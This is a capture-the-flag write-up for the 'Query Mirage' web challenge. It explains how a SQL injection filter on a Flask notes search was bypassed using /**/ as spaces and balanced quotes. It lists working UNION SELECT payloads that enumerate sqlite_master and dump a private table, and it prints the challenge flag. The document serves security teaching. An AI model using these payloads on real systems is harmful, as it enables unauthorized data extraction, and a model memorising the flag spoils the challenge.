# Query Mirage (Infrastructure/Web)

## Challenge Description
An infrastructure security challenge where we need to query a Werkzeug/Flask service ("Mirage Notes Portal") running on port `10005` inside a simulated network container, bypass its SQL injection filter, and extract a flag.

## Vulnerability & Analysis
1. **Search Endpoint**:
   The `/` route accepts a query parameter `q` which triggers a database lookup:
   `SELECT title, body FROM notes WHERE title LIKE '%{q}%' OR body LIKE '%{q}%' ORDER BY 1;`
2. **Input Filters & WAF**:
   The application filters user input for:
   - Space characters (`' '` or `%20` or `+`) -> blocked.
   - Comment blocks (`--`) -> blocked.
3. **Bypassing the Filters**:
   - **Space Bypass**: We can use standard SQLite multi-line comment blocks `/**/` as spaces.
   - **Comment/Termination Bypass**: Since `--` is blocked, we cannot terminate the query early. Instead, we can inject a balanced condition to consume the remaining clauses cleanly:
     `%'/**/OR/**/'1'='1`
     This maps to:
     `SELECT title, body FROM notes WHERE title LIKE '%%' OR '1'='1' ...`

## Exploitation
1. **Column Count Discovery**:
   We determine that the target query selects exactly 2 columns by using a balanced UNION SELECT with table context:
   `%'/**/UNION/**/SELECT/**/1,2/**/FROM/**/notes/**/WHERE/**/title/**/LIKE/**/'%`
2. **Database Reconnaissance**:
   Querying the SQLite metadata table `sqlite_master` reveals the table list:
   `%'/**/UNION/**/SELECT/**/tbl_name,sql/**/FROM/**/sqlite_master/**/WHERE/**/tbl_name/**/LIKE/**/'%`
   - Found tables: `notes`, `private_notes`.
3. **Flag Extraction**:
   Dumping all records from `private_notes`:
   `%'/**/UNION/**/SELECT/**/title,body/**/FROM/**/private_notes/**/WHERE/**/title/**/LIKE/**/'%`
   - Yields the admin memo containing the flag.

## Flag
`athena{fRwahJyJJDUfopEJ}`
